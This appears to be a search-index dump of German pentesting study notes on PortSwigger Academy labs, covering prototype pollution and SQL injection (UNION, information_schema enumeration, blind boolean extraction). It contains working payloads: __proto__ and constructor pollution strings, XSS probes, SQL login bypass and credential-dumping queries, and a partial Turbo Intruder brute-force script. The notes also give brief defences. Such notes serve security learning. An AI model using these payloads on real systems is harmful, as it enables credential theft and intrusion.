</ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#mit-dom-invader-burp-eingebauter-browser","title":"Mit DOM Invader (Burp eingebauter Browser)","text":"<p>Manuelles Probieren ist z\u00e4h. DOM Invader testet w\u00e4hrend des Surfens automatisch auf Prototype-Pollution-Quellen und spart massiv Zeit.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#gadgets-finden-manuell","title":"Gadgets finden (manuell)","text":"<p>Wenn du eine Quelle hast (du kannst Properties in <code>Object.prototype</code> schreiben), suche nach Gadgets (Properties, die unsicher genutzt werden und in einen Sink laufen).</p> <p>Vorgehen: 1. JS-Code sichten (App + Drittbibliotheken): welche Properties werden genutzt? 2. In Burp: Proxy \u2192 Options \u2192 Intercept server responses aktivieren und die Response mit dem Ziel-Script abfangen. 3. <code>debugger;</code> am Anfang des Scripts einf\u00fcgen, dann Requests/Responses durchlassen. 4. Seite laden \u2192 Ausf\u00fchrung pausiert. In der Console Property-Hook setzen (ersetze <code>YOUR-PROPERTY</code>):</p> <p></p><pre><code>Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {\n  get() {\n    console.trace();\n    return 'polluted';\n  }\n});\n</code></pre> \u2192 F\u00fcgt die Property global hinzu; jede Nutzung loggt einen Stacktrace.<p></p> <ol> <li>Weiterlaufen lassen und Console beobachten. Erscheint ein Stacktrace, wird die Property irgendwo gelesen.</li> <li>Zum Code springen (Link im Trace) und step-by-step pr\u00fcfen, ob der Wert in einen Sink wandert (<code>innerHTML</code>, <code>eval</code>, <code>Function</code>, etc.).</li> <li>F\u00fcr weitere Verdachts-Properties wiederholen.</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#gadgets-mit-dom-invader","title":"Gadgets mit DOM Invader","text":"<p>DOM Invader kann automatisch nach Gadgets scannen und teils sogar eine DOM-XSS-PoC erzeugen. Ergebnis: Minuten statt Stunden.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#mini-cheat-sheet","title":"Mini-Cheat-Sheet","text":"<p>Quellen testen </p><pre><code>?__proto__[x]=y\n?__proto__.x=y\n# und via JSON / postMessage\n</code></pre><p></p> <p>Erfolg pr\u00fcfen </p><pre><code>Object.prototype.x // y?\n</code></pre><p></p> <p>Gadget-Probe </p><pre><code>Object.defineProperty(Object.prototype, 'template', {\n  get(){ console.trace();\n  return '&lt;img src=x onerror=alert(1)&gt;'}\n});\n</code></pre> Typische Sinks - DOM: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, unsichere Templating-APIs - JS: <code>eval</code>, <code>new Function</code>, <code>setTimeout(\"...\")</code> (String) - Node/Server: Pfad-/Command-Aufrufe \u00fcber unsichere Optionen<p></p> <p>Abwehr kurz - Proto-Keys blocken: <code>__proto__</code>, <code>prototype</code>, <code>constructor</code> (rekursiv) - Nur eigene Properties nutzen: <code>Object.hasOwn(obj, key)</code> - Null-Prototype f\u00fcr Config/Dicts: <code>Object.create(null)</code> - Kein ungefiltertes Deep-Merge von Query/Hash/JSON.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#prototype-pollution-via-the-constructor","title":"Prototype pollution via the constructor","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#warum-uberhaupt","title":"Warum \u00fcberhaupt?","text":"<p>Viele Fixes filtern nur den Key <code>__proto__</code> raus. Aber es gibt eine zweite T\u00fcr zu <code>Object.prototype</code>:</p> <pre><code>irgendeinObjekt.constructor.prototype  // == Object.prototype (bei normalen Objekten)\n</code></pre> <p>Hei\u00dft: selbst wenn <code>__proto__</code> blockiert ist, kannst du oft noch \u00fcber <code>constructor.prototype</code> an das Prototyp-Objekt ran.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#wie-wirds-ausgenutzt","title":"Wie wird\u2019s ausgenutzt?","text":"<p>Angriffsidee: Eine unsichere deep-merge Funktion, die rekursiv Schl\u00fcssel aus einem User-Objekt in ein Zielobjekt kopiert.</p> <p>Beispiel-Payload (z. B. als JSON geliefert):</p> <pre><code>{\n  \"constructor\": {\n    \"prototype\": {\n      \"polluted\": \"yes\"\n    }\n  }\n}\n</code></pre> <p>Pseudo-Merge (typisch unsicher):</p> <pre><code>function merge(target, src) {\n  for (const k in src) {\n    if (isObject(src[k]) &amp;&amp; isObject(target[k])) {\n      // \u26a0\ufe0f Achtung: target[\"constructor\"] ist eine *Funktion* (Object),\n      // und Funktionen sind in JS auch Objekte \u2192 wird rein gemerged!\n      merge(target[k], src[k]);\n    } else {\n      target[k] = src[k];\n    }\n  }\n}\n</code></pre> <p>Was passiert Schritt f\u00fcr Schritt?</p> <ol> <li><code>target</code> ist z. B. <code>{}</code>.</li> <li>Der Key <code>constructor</code> existiert bereits auf <code>{}</code> (geerbt), und ist die Funktion <code>Object</code>.</li> <li><code>merge</code> sieht: <code>src.constructor</code> ist ein Objekt und <code>target.constructor</code> ist (eine Funktion \u21d2) \u201eobjektartig\u201c \u2192 rekursiv rein.</li> <li>N\u00e4chste Ebene: <code>prototype</code>. Bei der Funktion <code>Object</code> ist <code>prototype</code> genau <code>Object.prototype</code>.</li> <li>Wieder rekursiv: <code>polluted = \"yes\"</code> wird auf <code>Object.prototype.polluted</code> geschrieben.</li> <li>Danach hat jedes normale Objekt die Eigenschaft:     <code>({}).polluted === \"yes\"  // true</code></li> </ol> <p>Du hast also global den Prototyp \u201evergiftet\u201c.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#bypassing-flawed-key-sanitization","title":"Bypassing flawed key sanitization","text":"<p>Ein obvious Way sich gegen prototype Pollution abzusichern ist es die property keys zu sanitizen bevor die gemerged werden - Oft scheitern Entwickler aber daran das rekursiv zu sanitizen. z. B. <code>vulnerable-website.com/?__pro__proto__to__.gadget=payload</code></p> <p>wenn man jetzt <code>__proto__</code> ohne Wiederholung bereinigt, bringt das rein gar nichts weil durch die Zusammenstellung sich ein neues <code>__proto__</code> bildet.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#prototype-pollution-in-external-libraries","title":"Prototype pollution in external libraries","text":"<p>Bei Fremdlibs steckt die Pollution-Quelle (Source) oder der Gadget-Sink im Code, den du nicht kontrollierst (z. B. Deep-Merge-Utils, Settings-Parser, Templating, i18n, Feature-Flags, uvm.).</p> <p>Man brauchst also ein Tool, das alle Pfade abklappert(Burp DOM Invader) - h\u00e4ndisch \u00fcbersieht man leicht was.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/3.%20Prototype%20Pollution%20via%20Browser/","title":"3. Prototype Pollution via Browser","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/3.%20Prototype%20Pollution%20via%20Browser/#prototype-pollution-via-browser-apis","title":"Prototype pollution via browser APIs","text":"<p>Es gibt eine Reihe von verbreiteten Prototype-Gadgets in den Javascript-APIs die der Browser \u00fcblicherweise bereitstellt.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/3.%20Prototype%20Pollution%20via%20Browser/#prototype-pollution-via-fetch","title":"Prototype pollution via fetch()","text":"<p>Die Fetch API erm\u00f6glicht es, HTTP-Requests per JavaScript abzusetzen. <code>fetch()</code> nimmt zwei Argumente: 1. Die URL, an die die Anfrage gesendet wird. 2. Ein Options-Objekt, mit dem du Teile der Anfrage steuerst (Methode, Header, Body-Parameter usw.).</p> <p>Beispiel f\u00fcr einen POST-Request mit <code>fetch()</code>: </p><pre><code>fetch('https://normal-website.com/my-account/change-email', {\n    method: 'POST',\n    body: 'user=carlos&amp;email=carlos%40ginandjuice.shop'\n})\n</code></pre><p></p> <p>Der folgende Code ist potenziell \u00fcber Prototype Pollution f\u00fcr DOM-XSS verwundbar:</p> <pre><code>fetch('/my-products.json',{method:\"GET\"})\n    .then((response) =&gt; response.json())\n    .then((data) =&gt; {\n        let username = data['x-username'];\n        let message = document.querySelector('.message');\n        if(username) {\n            message.innerHTML = `My products. Logged in as &lt;b&gt;${username}&lt;/b&gt;`;\n        }\n        let productList = document.querySelector('ul.products');\n        for(let product of data) {\n            let product = document.createElement('li');\n            product.append(product.name);\n            productList.append(product);\n        }\n    })\n    .catch(console.error);\n</code></pre> <p>Um dies auszunutzen, k\u00f6nnte ein Angreifer <code>Object.prototype</code> mit einer <code>headers</code>-Property vergiften, die einen b\u00f6sartigen Header <code>x-username</code> enth\u00e4lt:</p> <p><code>?__proto__[headers][x-username]=&lt;img/src/onerror=alert(1)&gt;</code></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/3.%20Prototype%20Pollution%20via%20Browser/#prototype-pollution-uber-objectdefineproperty","title":"Prototype Pollution \u00fcber <code>Object.defineProperty()</code>","text":"<p>Entwickler, die Prototype Pollution kennen, versuchen manchmal, potenzielle Gadgets zu blockieren, indem sie <code>Object.defineProperty()</code> nutzen. Damit setzen sie eine nicht konfigurierbare und nicht schreibbare Property direkt auf dem betroffenen Objekt:</p> <pre><code>Object.defineProperty(vulnerableObject, 'gadgetProperty', {\n    configurable: false,\n    writable: false\n})\n</code></pre> <p>An sich sch\u00f6n und gut, aber Fehleranf\u00e4llig. \u00c4hnlich wie <code>fetch()</code> nimmt <code>Object.defineProperty()</code> ein Options-Objekt entgegen \u2013 den sogenannten Descriptor (siehe oben). Dar\u00fcber k\u00f6nnen Entwickler u. a. auch einen Initialwert f\u00fcr die definierte Property setzen. Wenn sie die Property aber nur definieren, um gegen Prototype Pollution abzusichern, setzen sie oft keinen Wert.</p> <p>In diesem Fall kann ein Angreifer die Abwehr umgehen, indem er <code>Object.prototype</code> mit einer b\u00f6sartigen <code>value</code>-Property verschmutzt. Wenn der Descriptor, der an <code>Object.defineProperty()</code> \u00fcbergeben wird, diese <code>value</code>-Property erbt, wird der angreiferkontrollierte Wert am Ende doch der Gadget-Property zugewiesen.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/1.%20SQL%20Injection/","title":"1. SQL Injection","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/1.%20SQL%20Injection/#was-ist-sql-injection","title":"Was ist SQL Injection","text":"<p>Es ist eine Schwachstelle in der, der Angreifer Anfragen die aus der App zur Datenbank gesendet werden abgreift und manipuliert um ggf. Daten von anderen Usern abzufragen bzw. generell Daten auf die man eigentlich keinen Zugriff hat. Bei manch gravierenden Schwachstellen l\u00e4sst sich ggf. auch der Backend-Server manipulieren.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/1.%20SQL%20Injection/#wie-erkennt-man-sql-schwachstellen","title":"Wie erkennt man SQL Schwachstellen","text":"<p>Durch eine systematische Reihe von Test an jedem Eingabepunkt der Anwendung - z. B. beim Login die <code>Username</code> <code>Password</code> Felder. - Eingabe von <code>'</code> und beobachte Fehlermeldung - SQL-spezifischer Syntax die den urspr\u00fcnglichen Wert ver\u00e4nden     - Gib etwas ein das das Ergebnis nicht \u00e4ndern sollte vs Gib etwas ein, das das Ergebnis ver\u00e4ndert sollte - Boolean-Checks(Immer Wahr, Immer Falsch) - Zeitverz\u00f6gerung(time-based tests)     - Man proviert eine Abfrage die l\u00e4nger braucht als normal und misst die Antwortzeit - Wenn die Antwortzeit deutlich l\u00e4nger dauert kann man davon ausgehen, dass ein Befehl in der Datenbank ausgef\u00fchrt wird. - OAST / Out of band (Netzwerk Check)     - Man l\u00e4sst die App etwas ausf\u00fchren, sodass die DB versucht nach au\u00dfen auf z. B. einen exploit-server zu connecten</p> <p>Die meisten SQL-Injection-Schwachstellen treten in der <code>WHERE</code>-Klausel einer <code>SELECT</code>-Abfrage auf. Mit diesem Typ sind die meisten erfahrenen Tester vertraut. SQL-Injection kann jedoch an jeder Stelle innerhalb einer Abfrage und in verschiedenen Abfragetypen auftreten. Weitere h\u00e4ufige Stellen, an denen SQL-Injection vorkommt, sind:</p> <ul> <li>In <code>UPDATE</code>-Anweisungen, innerhalb der zu aktualisierenden Werte oder in der <code>WHERE</code>-Klausel.</li> <li>In <code>INSERT</code>-Anweisungen, innerhalb der eingef\u00fcgten Werte.</li> <li>In <code>SELECT</code>-Anweisungen, innerhalb des Tabellen- oder Spaltennamens.</li> <li>In <code>SELECT</code>-Anweisungen, innerhalb der <code>ORDER BY</code>-Klause</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/1.%20SQL%20Injection/#versteckte-daten-anzeigen-lassen","title":"Versteckte Daten anzeigen lassen","text":"<p>z. B. Ein Shop zeigt die Produkte in unterschiedlichen Kategorien an. Wenn User auf \"Gifts\" Kategorie klickt, ruft der Browser folgendes auf: </p><pre><code>https://insecure-website.com/products?category=Gifts\n</code></pre><p></p> <p>Dadurch fragt die App in der Datenabnk folgendes ab. </p><pre><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1\n</code></pre><p></p> <p>Und gibt folgendes zur\u00fcck: - all details (<code>*</code>) - from the\u00a0<code>products</code>\u00a0table - where the\u00a0<code>category</code>\u00a0is\u00a0<code>Gifts</code> - and\u00a0<code>released</code>\u00a0is\u00a0<code>1</code>.</p> <p>The restriction\u00a0<code>released = 1</code>\u00a0is being used to hide products that are not released. We could assume for unreleased products,\u00a0<code>released = 0</code>.</p> <p>--&gt; Angemommen der Shop hat keinen SQL Injection Schutz, dann k\u00f6nnen Angreifer folgenden Request erstellen. </p><pre><code>https://insecure-website.com/products?category=Gifts'--\n</code></pre><p></p> <p>--&gt; Die DB ruft dann foglendes auf: </p><pre><code>SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1\n</code></pre> - <code>--</code> ist ein Kommentar Indikator. D.h alles danach wird nicht verarbeitet<p></p> <p>Oder auch mit folgendem Befehl: <code>https://insecure-website.com/products?category=Gifts'+OR+1=1--</code></p> <p>--&gt; DB ruft auf: </p><pre><code>SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1\n</code></pre><p></p> <p>Die modifizierte Anfrage gibt entweder alle Items mit Kategorie=Gifts oder 1=1, also gibt es alle Items zur\u00fcck weil 1=1 immer true</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/1.%20SQL%20Injection/#subverting-application-logic","title":"Subverting application logic","text":"<p>Bei einer App in der man sich z. B. mit Benutzername und Passwort anmelden kann: </p><pre><code>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'\n</code></pre><p></p> <p>Wenn die Abfrage die Daten eines Bentuzers zur\u00fcckliefert, ist die Anmeldung erfolgreich. Andernfalls wird sie abgelehnt. Wenn der Angreifer diese Abfrage aber zB ver\u00e4ndert und beim benutzername folgendes baut <code>administrator'--</code> sieht die Anfrage wie folgt aus: Die Passwort abfrage wird einfach auskommentiert </p><pre><code>SELECT * FROM users WHERE username = 'administrator'--' AND password = ''\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/2.%20SQL%20Injection%20UNION%20Attacks/","title":"2. SQL Injection UNION Attacks","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/2.%20SQL%20Injection%20UNION%20Attacks/#was-ist-das","title":"Was ist das","text":"<p>UNION Attack beschreibt das Szenario indem man versucht auf andere Tabellen, innerhalb einer definierten Abfrage f\u00fcr eine bestimmte Tabelle, zuzugreifen. Au\u00dferdem haben UNION Abfragen zwei Bedingungen. - Beide Tabellen m\u00fcssen die gleiche Anzahl spalten zur\u00fcckgeben bei der Abfrage - Die Datentypen f\u00fcr die jeweiligen Spalten m\u00fcssen auch kompatibel sein</p> <p>Bevor man deswegen eine UNION Attack durchf\u00fchren kann m\u00fcssen wir uns erstmal foglende Fragen stellen. - Wie viele Spalten werden von der originalen Query zur\u00fcckgeliefert - Welche Datentypen haben die Spalten</p> <p>Aber wie man das aber umgehen kann. - Fehlende Spalten mit NULL erg\u00e4nzen - Bei inkompatiblen Datentypen kann man ggf. den Wert casten</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/2.%20SQL%20Injection%20UNION%20Attacks/#bestimmen-der-anzahl-benotigter-spalten","title":"Bestimmen der Anzahl ben\u00f6tigter Spalten","text":"<p>Order By-Technik </p><pre><code>' ORDER BY 1-- \n' ORDER BY 2-- \n' ORDER BY 3-- \n...\n</code></pre> - (das f\u00fchrende <code>'</code> schlie\u00dft die bisher offene Zeichenkette im SQL; <code>--</code> kommentiert den Rest aus) - Beobachte die Antworten: bis zum richtigen Index bleibt die Antwort \u201enormal\u201c. Sobald <code>ORDER BY k</code> gr\u00f6\u00dfer ist als die Anzahl der Spalten, bekommst du entweder eine DB-Fehlermeldung (z. B. \u201eORDER BY position number 5 is out of range\u2026\u201c), eine generische Fehlerseite, keine Ergebnisse oder ein erkennbares Verhalten, das sich \u00e4ndert. - Wenn z. B. <code>ORDER BY 4</code> einen Fehler erzeugt, aber <code>ORDER BY 3</code> nicht, dann hat die Query 3 oder weniger Spalten \u2014 meistens bedeutet das: originale Spaltenanzahl = 3.<p></p> <p>Manche Apps fangen DB-Errors ab und zeigen nichts. Dann musst du Unterschiede detektierbar machen (z. B. Response-L\u00e4nge, HTTP-Status, spezifische HTML-Teile). Beginne mit <code>ORDER BY 1</code> und erh\u00f6he sequentiell; h\u00f6re auf, wenn du eine \u00c4nderung siehst.</p> <p>UNION-SELECT-NULL-Technik (Meist genutzte Methode) Idee: Du h\u00e4ngst an die originale Abfrage ein <code>UNION SELECT ...</code> an und gibst in der injecten SELECT so viele <code>NULL</code>-Platzhalter an, bis die DB nichts mehr meckert. <code>NULL</code> passt in (fast) jeden Datentyp - darum nutzen wir es.</p> <p></p><pre><code>' UNION SELECT NULL-- \n' UNION SELECT NULL,NULL-- \n' UNION SELECT NULL,NULL,NULL-- \n...\n</code></pre> - Beispiel mit Anzahl NULLS != Anzahl tats\u00e4chlichen Columns  - Beispiel mit Anzahl NULLS == Anzahl tats\u00e4chlichen Columns <p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/2.%20SQL%20Injection%20UNION%20Attacks/#finde-spalten-mit-nutzlichen-datentypen","title":"Finde Spalten mit n\u00fctzlichen  Datentypen","text":"<p>Nachdem wir herausgefunden haben wie viele Spalten wir haben k\u00f6nnen wir die Datentypen vergleichen. String Datentypen </p><pre><code>' UNION SELECT 'a',NULL,NULL,NULL--\n' UNION SELECT NULL,'a',NULL,NULL--\n' UNION SELECT NULL,NULL,'a',NULL--\n' UNION SELECT NULL,NULL,NULL,'a'--\n</code></pre> Anhand der Response k\u00f6nnen wir schauen wie die DB auf den Wert a reagiert. <code>Conversion failed when converting the varchar value 'a' to data type int.</code><p></p> <p>-&gt; Wenn Error-Antwort generisch ist wie zB <code>500 Internal Server Error</code> bekommen wir keine direkte Antwort um welchen Datentyp es sich handelt. Daher m\u00fcssen wir einfach die Datentypen manuell testen im sinne von: Numerische Datentypen </p><pre><code>' UNION SELECT 123,NULL,NULL,NULL--\n' UNION SELECT NULL,123,NULL,NULL--\n' UNION SELECT NULL,NULL,123,NULL--\n' UNION SELECT NULL,NULL,NULL,123--\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/2.%20SQL%20Injection%20UNION%20Attacks/#database-spezifischer-syntax","title":"Database spezifischer Syntax","text":"<p>Jede Datenbank hat eine etwas andere Syntax. Unter der folgenden Seite l\u00e4sst sich eine kleine \u00dcbersicht \u00fcber die unterschiedlichen Syntax finden. Besonders wichtig beimfinden von Spalten und Datentypen brauchen wir am Ende ein Comment-Syntax. D.h wir m\u00fcssen einfach bisschen rumprobieren und gucken was so funktioniert.</p> <p>SQL-Injection-Cheatsheet</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/2.%20SQL%20Injection%20UNION%20Attacks/#wie-macht-man-sich-union-jetzt-richtig-zu-nutze-um-damit-interessante-daten-abzufragen","title":"Wie macht man sich UNION jetzt richtig zu nutze um damit interessante Daten abzufragen","text":"<p>Sobald wir Anzahl Columns und die dazugeh\u00f6rigen Datentypen herausgefunden haben, k\u00f6nnen wir Daten aus anderen Tabellen abfragen mit UNION.</p> <p>z. B. - In der Datenbank gibt es eine Tabelle <code>users</code> mit den Spalten <code>username</code> und <code>password</code>.     Dann k\u00f6nnte man folgendes eingeben, um die Inhalte der <code>users</code>-Tabelle abzurufen:     <code>' UNION SELECT username, password FROM users--</code></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/2.%20SQL%20Injection%20UNION%20Attacks/#mehrere-werte-erhalten-trotz-einzelner-spalte","title":"Mehrere Werte erhalten trotz einzelner Spalte","text":"<p>Manchmal kann es sein, dass nur eine einzige Spalte zur\u00fcckgegeben wird. Um jetzt eben trotzdem alle Werte zu bekommen m\u00fcssen wir die gesamten Werte als Eine Ausgabe darstellen. z. B. mit: <code>' UNION SELECT username || '~' || password FROM users--</code></p> <p>die Ausgabe sieht dann wie folgt aus. </p><pre><code>administrator~s3cure\nwiener~peter\ncarlos~montoya\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/2.%20SQL%20Injection%20UNION%20Attacks/#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column","title":"Lab: SQL injection UNION attack, retrieving multiple values in a single column","text":"<p><code>' UNION SELECT NULL--</code> -&gt; error <code>' UNION SELECT NULL,NULL--</code> -&gt; OK</p> <p><code>' UNION SELECT 'a',NULL--</code>-&gt;error <code>' UNION SELECT 123,NULL--</code>-&gt;OK <code>' UNION SELECT 123,'a'--</code>-&gt;OK -&gt; Spalte1 = Number, Spalte2 = String</p> <p>Dann bauen wir eine UNION SELECT Abfrage entsprechend den Kriterien. </p><pre><code>GET /filter?category=' UNION SELECT NULL, concat(username, '~', password) FROM users-- HTTP/2\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/2.%20SQL%20Injection%20UNION%20Attacks/#querying-the-database-type-and-version","title":"Querying the database type and version","text":"<p>Um SQL-Injection auszunutzen, ist es oft n\u00f6tig, Informationen \u00fcber die Datenbank zu bekommen. Dazu geh\u00f6ren: - Der Typ und die Version der Datenbanksoftware. - Welche Tabellen und Spalten die Datenbank enth\u00e4lt.</p> <p>Das l\u00e4sst sich mit folgenden Befehlen f\u00fcr beliebige Datenbanken testen:</p> Datenbank Query Microsoft / MySQL <code>SELECT @@version</code> Oracle <code>SELECT * FROM v$version</code> PostgreSQL <code>SELECT version()</code>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/3.%20SQL%20Injection%20Set%20Of%20Views/","title":"3. SQL Injection Set Of Views","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/3.%20SQL%20Injection%20Set%20Of%20Views/#set-of-views","title":"Set Of Views","text":"<p>SQL-Injection-Cheatsheet Die meisten Datenbanken haben etwas das nennt sich Set of Views und zeigt ein Informations Schema. Das ist wichtig f\u00fcr viele Daten weil es m\u00fchsam w\u00e4re f\u00fcr jeden User jeden einzelnen Eintrag aus der Datenbank abzufragen. Daher gibt es diese Listen die sich nur updaten wenn auch etwas in der Datenbank ver\u00e4ndert wird - beschleunigt den Abruf und entlastet die Datenbank. <code>SELECT * FROM information_schema.tables</code></p> <p>z. B: bei folgendem Aufbau. Erst schauen welche, - Database Version - Anzahl Elemente und welche Typen</p> <p><code>' UNION SELECT @@VERSION, NULL--</code> <code>' UNION SELECT 'a','a'--</code></p> TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE ##### Table_Names herausfinden <p><code>SELECT table_name,null FROM information_schema.tables</code> returned Liste aller tables und finden: <code>users_ceswxa</code> </p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/3.%20SQL%20Injection%20Set%20Of%20Views/#column_names-herausfinden","title":"Column_Names herausfinden","text":"TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE MyDatabase dbo Users UserId INT MyDatabase dbo Users Username VARCHAR MyDatabase dbo Users Password VARCHAT <code>' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_ceswxa'--</code> <p>-&gt; Dann haben wir alle Informationen die wir brauchen und k\u00f6nnen einen Aufruf wie. <code>password_tpmfyg</code> <code>email</code> <code>username_aqrsop</code></p> <p>Dann k\u00f6nnen wir etwas wie folgendes bauen: <code>' UNION SELECT username_aqrsop,password_tpmfyg FROM users_ceswxa--</code></p> <p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/4.%20Blind%20SQL%20Injection/","title":"4. Blind SQL Injection","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/4.%20Blind%20SQL%20Injection/#was-ist-blind-sql-injection","title":"Was ist Blind SQL Injection","text":"<p>Wenn eine Applikation eine SQL Injection Schwachstelle hat, aber die HTTP Antwort eine andere ist als die relevanten SQL query Details.</p> <p>In der hinsicht sind Funkionen wie UNION nicht so sinnvoll weil diese aufgrund von Daten die man bekommt zusammengestellt werden.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/4.%20Blind%20SQL%20Injection/#exploiting-blind-sql-injection","title":"Exploiting Blind SQL Injection","text":"<p>Wir gehen davon aus, wir haben einen Cookie welcher Daten f\u00fcr analytische Zwecke abzwackt. <code>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</code></p> <p>Wenn ein Cookie sowas wie TrackingId hat, schau die SQL Query ob der Nutzer bekannt oder unbekannt ist und ruft sowas wie: <code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'</code> auf.</p> <p>In diesem Fall werden die Daten nicht zum User returned.  Allerdings verh\u00e4lt sich die App anders und man hat sowas wie ein \"Welcome Back\" Abschnitt welcher Zug\u00e4nge erm\u00f6glicht.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/4.%20Blind%20SQL%20Injection/#boolean-based","title":"Boolean-based","text":"<p>Man nutzt aus, dass sich die Antwort einer HTTP Anfrage \u00e4ndert je nachdem ob die eingeschleuse Bedingung in der Datenbank Wahr oder Falsch ist.</p> <p>Beispiel-Mechanik, vereinfacht: - Request A enth\u00e4lt eine injizierte Bedingung, die wahr ist -&gt; die Seite zeigt z. B. \u201eWelcome back\u201c. - Request B enth\u00e4lt eine injizierte Bedingung, die falsch ist -&gt; \u201eWelcome back\u201c fehlt.     Anhand dieses Unterschieds wei\u00dft du, ob die Bedingung true/false ist.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/4.%20Blind%20SQL%20Injection/#zum-beispiel-beim-auslesen-von-passwortern-zeichen-fur-zeichen","title":"Zum Beispiel beim auslesen von Passw\u00f6rtern - Zeichen f\u00fcr Zeichen","text":"<p><code>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')&lt;'m'--</code> -&gt; Wenn die Bedingung Wahr ist, wissen wir, dass der erste Buchstabe des Passworts kleiner als 'm' ist. Dann bruteforcen wir den Rest, Zeichen f\u00fcr Zeichen bis das Passwort vollst\u00e4ndig rekonstruiert ist. Auch in diesem Fall nehmen unterschiedliche Datenbanken unterschiedliche Synonyme f\u00fcr den SUBSTRING -&gt; SQL-Injection-Cheatsheet</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/4.%20Blind%20SQL%20Injection/#auslesen-der-passwortlange","title":"Auslesen der Passwortl\u00e4nge","text":"<p><code>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a'--</code></p> <p>Mit folgendem Script l\u00e4sst sich das im Turbo Intruder einsetzen. Prinzipiell ist es wie bei Intruder die Cluster Bomb mit 2 Paramtern(Numbers, Brute-Froce) - Wir laufen f\u00fcr jede Stelle im Passwort jedes Zeichen aus der Liste ab. </p><pre><code>def queueRequests(target, wordlists):\n    engine = RequestEngine(\n        endpoint=target.endpoint,\n        concurrentConnections=5,\n        requestsPerConnection=100,\n        pipeline=False,\n        engine=Engine.THREADED\n    )\n\n    # L\u00e4nge des Passworts (Anzahl Iterationen f\u00fcr 'i')\n    password_length = 20\n\n    # Zeichenliste (als Liste einzelner Zeichen)\n    characters = list(\"0123456789abcdefghijklmnopqrstuvwxyz\")\n\n    # Vorlage-Request (typisch ein String mit PLACEHOLDER1 / 